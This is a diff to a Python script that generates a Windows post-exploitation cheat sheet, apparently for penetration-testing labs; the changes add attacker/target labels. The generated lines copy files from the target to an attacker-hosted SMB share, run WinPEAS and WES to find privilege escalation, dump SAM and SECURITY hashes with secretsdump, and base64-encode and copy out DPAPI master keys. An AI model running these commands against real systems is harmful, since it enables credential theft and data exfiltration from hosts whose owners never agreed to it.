@@ -191,9 +191,11 @@ def build(
     # 9. SMB helpers
     L += [
         "# 9. SMB helpers",
+        "# [ATTACKER] Start SMB server from your Kali/Debian box",
         "cd ~/share",
         "sudo smbserver.py share . -smb2support",
         "",
+        "# [TARGET] Map share + copy files",
         "net use \\\\{}\\share".format(lhost),
         "copy \\\\{}\\share\\<FILE> <FILE>".format(lhost),
         "copy <FILE> \\\\{}\\share".format(lhost),
@@ -215,16 +217,17 @@ def build(
     L += [
         "# 11. WinPEAS",
         "cd /d {}".format(WIN_PUBLIC),
+        "# Optional: enable ANSI escape processing for cleaner coloured output",
+        "REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1",
         "winPEASany.exe",
         "winPEASany.exe > winpeas.txt",
         "more winpeas.txt",
-        "REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1",
         "",
     ]
 
     # 12. WES
     L += [
-        "# 12. WES (attacker-side)",
+        "# 12. WES [ATTACKER]",
         "wes systeminfo.txt --impact \"Elevation of Privilege\" --severity critical,important --exploits-only",
         "wes systeminfo.txt --impact \"Elevation of Privilege\" --severity critical,important --exploits-only --output wes_eop.txt",
         "less -R wes_eop.txt",
@@ -290,7 +293,7 @@ def build(
 
     # 18. Offline hashes
     L += [
-        "# 18. Offline hashes (attacker-side)",
+        "# 18. Offline hashes [ATTACKER]",
         "sudo su",
         "secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL",
         "",
@@ -299,11 +302,13 @@ def build(
     # 19. DPAPI
     L += [
         "# 19. DPAPI master key exfil",
+        "# [TARGET] Locate and base64-encode masterkey file",
         "cd C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>",
         "powershell -C \"Get-ChildItem . -Force\"",
-        "certutil -encode <MASTERKEY_GUID_FILE> output",
-        "type output",
-        "cat masterkey.b64 | base64 -d > masterkey",
+        "certutil -encode <MASTERKEY_GUID_FILE> masterkey.b64",
+        "type masterkey.b64",
+        "# [ATTACKER] Decode the base64 blob you copied out",
+        "base64 -d masterkey.b64 > masterkey",
         "",
     ]
 
